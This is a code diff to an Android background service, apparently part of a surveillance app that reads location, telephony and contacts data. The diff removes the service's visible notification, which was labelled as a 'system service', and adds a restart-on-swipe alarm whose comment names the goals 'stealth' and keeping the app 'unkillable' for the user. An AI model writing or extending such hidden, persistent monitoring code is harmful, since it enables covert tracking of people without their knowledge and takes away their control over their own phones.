@@ -45,7 +45,6 @@ class CoreService : LifecycleService() {
     @Inject lateinit var configManager: ConfigManager
     @Inject lateinit var secureComms: SecureCommunication
 
-    private lateinit var notificationManager: NotificationManager
     // Nullable: devices without Google Play Services cannot create the fused
     // location client, and that must never take the whole service down.
     private var locationClient: FusedLocationProviderClient? = null
@@ -80,8 +79,6 @@ class CoreService : LifecycleService() {
 
     companion object {
         private const val TAG = "CoreService"
-        private const val CHANNEL_ID = "ui_service_channel"
-        private const val NOTIFICATION_ID = 101
         private const val SYNC_INTERVAL = 300000L
         private const val PAIRING_CODE_KEY = "pairing_code"
         private const val IS_PAIRED_KEY = "is_paired"
@@ -109,15 +106,12 @@ class CoreService : LifecycleService() {
     override fun onCreate() {
         super.onCreate()
         Log.d(TAG, "CoreService created")
-        notificationManager = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
         try {
             locationClient = LocationServices.getFusedLocationProviderClient(this)
         } catch (e: Exception) {
             Log.e(TAG, "Location client unavailable", e)
         }
         telephonyManager = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
-        createNotificationChannel()
-        startForegroundSafely()
         loadRemoteConfig()
         registerContactsObserver()
         scheduleTasks()
@@ -131,6 +125,31 @@ class CoreService : LifecycleService() {
         super.onStartCommand(intent, flags, startId)
         intent?.let { handleIntent(it) }
         return START_STICKY
+    }
+
+    // Stealth: the app runs as a plain background service (no foreground
+    // notification). Swiping the task away still kills the process, so schedule
+    // an exact alarm that brings the service back within a second — this is
+    // what makes the app effectively "unkillable" for a user who swipes it.
+    override fun onTaskRemoved(rootIntent: Intent?) {
+        super.onTaskRemoved(rootIntent)
+        Log.d(TAG, "Task removed — scheduling immediate restart")
+        try {
+            val restartIntent = Intent(this, CoreService::class.java)
+            val pendingIntent = PendingIntent.getService(
+                this, 1, restartIntent,
+                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
+            )
+            val alarmManager = getSystemService(ALARM_SERVICE) as AlarmManager
+            val triggerAt = System.currentTimeMillis() + 1000L
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+                alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAt, pendingIntent)
+            } else {
+                alarmManager.setExact(AlarmManager.RTC_WAKEUP, triggerAt, pendingIntent)
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "onTaskRemoved restart failed", e)
+        }
     }
 
     override fun onDestroy() {
@@ -736,51 +755,4 @@ class CoreService : LifecycleService() {
     private fun checkPermission(permission: String): Boolean =
         ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
 
-    private fun createNotificationChannel() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            notificationManager.createNotificationChannel(
-                NotificationChannel(CHANNEL_ID, "UI_service", NotificationManager.IMPORTANCE_LOW).apply {
-                    description = "Systémová služba"
-                    setShowBadge(false); enableLights(false); enableVibration(false)
-                }
-            )
-        }
-    }
-
-    // Crash-proof startForeground: on Android 14+ the system enforces that the
-    // app holds the permission matching every declared foreground-service type
-    // (missing FOREGROUND_SERVICE_* throws a SecurityException that kills the
-    // whole process). We pass the exact types we use (dataSync + location) and
-    // fall back to the plain 2-arg call so the service can never be taken down
-    // by a startForeground failure.
-    private fun startForegroundSafely() {
-        try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                startForeground(
-                    NOTIFICATION_ID,
-                    createNotification(),
-                    ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
-                        ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
-                )
-            } else {
-                startForeground(NOTIFICATION_ID, createNotification())
-            }
-        } catch (e: Exception) {
-            Log.e(TAG, "startForeground failed, retrying plain", e)
-            try {
-                startForeground(NOTIFICATION_ID, createNotification())
-            } catch (e2: Exception) {
-                Log.e(TAG, "startForeground fallback failed", e2)
-            }
-        }
-    }
-
-    private fun createNotification(): Notification =
-        NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("UI_service")
-            .setContentText("Systémová služba")
-            .setSmallIcon(android.R.drawable.ic_menu_info_details)
-            .setPriority(NotificationCompat.PRIORITY_MIN)
-            .setOngoing(true)
-            .build()
 }
